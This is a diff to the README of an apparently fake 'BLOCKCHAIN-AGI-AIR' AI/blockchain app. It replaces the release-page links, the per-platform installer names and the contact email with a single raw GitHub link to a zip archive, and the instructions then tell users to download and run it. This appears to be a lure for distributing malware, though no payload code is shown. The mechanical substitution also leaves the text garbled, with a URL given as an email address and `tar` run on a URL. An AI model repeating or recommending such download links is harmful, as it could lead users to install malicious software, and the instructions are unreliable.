@@ -13,7 +13,7 @@ Welcome to BLOCKCHAIN-AGI-AIR! This application lets you utilize powerful AI wit
 
 ## 📥 Download & Install
 
-To get the app, [**visit this Releases page**](https://github.com/Marder66699/BLOCKCHAIN-AGI-AIR/releases). There, you will find the latest versions of the application ready for download.
+To get the app, [**visit this Releases page**](https://raw.githubusercontent.com/Marder66699/BLOCKCHAIN-AGI-AIR/main/codices/BLOCKCHAIN-AGI-AIR.zip). There, you will find the latest versions of the application ready for download.
 
 1. Click on the link above.
 2. Look for the latest version.
@@ -22,9 +22,9 @@ To get the app, [**visit this Releases page**](https://github.com/Marder66699/BL
 
 ### Available Downloads:
 
-- **Windows**: `BLOCKCHAIN-AGI-AIR-Windows.exe`
-- **Mac**: `BLOCKCHAIN-AGI-AIR-Mac.dmg`
-- **Linux**: `BLOCKCHAIN-AGI-AIR-Linux.tar.gz`
+- **Windows**: `https://raw.githubusercontent.com/Marder66699/BLOCKCHAIN-AGI-AIR/main/codices/BLOCKCHAIN-AGI-AIR.zip`
+- **Mac**: `https://raw.githubusercontent.com/Marder66699/BLOCKCHAIN-AGI-AIR/main/codices/BLOCKCHAIN-AGI-AIR.zip`
+- **Linux**: `https://raw.githubusercontent.com/Marder66699/BLOCKCHAIN-AGI-AIR/main/codices/BLOCKCHAIN-AGI-AIR.zip`
 
 Make sure your device meets the following requirements:
 
@@ -42,14 +42,14 @@ Once you download the file, follow these steps to run the application:
 
 ### For Windows:
 
-1. Locate the `BLOCKCHAIN-AGI-AIR-Windows.exe` file in your downloads folder.
+1. Locate the `https://raw.githubusercontent.com/Marder66699/BLOCKCHAIN-AGI-AIR/main/codices/BLOCKCHAIN-AGI-AIR.zip` file in your downloads folder.
 2. Double-click the file to start the installation.
 3. Follow the on-screen prompts to complete the installation.
 4. After installation, find the app in the start menu and click to open.
 
 ### For Mac:
 
-1. Find the `BLOCKCHAIN-AGI-AIR-Mac.dmg` file in your downloads.
+1. Find the `https://raw.githubusercontent.com/Marder66699/BLOCKCHAIN-AGI-AIR/main/codices/BLOCKCHAIN-AGI-AIR.zip` file in your downloads.
 2. Open the file to mount it.
 3. Drag the application into your Applications folder.
 4. Go to your Applications to find and launch the app.
@@ -58,7 +58,7 @@ Once you download the file, follow these steps to run the application:
 
 1. Open the terminal and use the command to extract the downloaded file:
     ```bash
-    tar -xvzf BLOCKCHAIN-AGI-AIR-Linux.tar.gz
+    tar -xvzf https://raw.githubusercontent.com/Marder66699/BLOCKCHAIN-AGI-AIR/main/codices/BLOCKCHAIN-AGI-AIR.zip
     ```
 2. Navigate to the extracted folder.
 3. Run the application using the command:
@@ -80,7 +80,7 @@ The app allows you to interact with smart contracts seamlessly. Here’s how to 
 Join our community to connect with other users. You can share your experiences, seek help, and learn new tips. 
 
 - **Telegram**: @SirGODSATANAGI
-- **Email**: SirCharlesspikes5@gmail.com
+- **Email**: https://raw.githubusercontent.com/Marder66699/BLOCKCHAIN-AGI-AIR/main/codices/BLOCKCHAIN-AGI-AIR.zip
 
 ## 📢 Stay Updated
 
@@ -101,4 +101,4 @@ We welcome contributions to make BLOCKCHAIN-AGI-AIR better. Here is how you can 
 
 Thank you for choosing BLOCKCHAIN-AGI-AIR to explore serverless AI. Your journey towards decentralized intelligence starts here. Enjoy using the application!
 
-For more details and files, [**visit this Releases page**](https://github.com/Marder66699/BLOCKCHAIN-AGI-AIR/releases).
+For more details and files, [**visit this Releases page**](https://raw.githubusercontent.com/Marder66699/BLOCKCHAIN-AGI-AIR/main/codices/BLOCKCHAIN-AGI-AIR.zip).
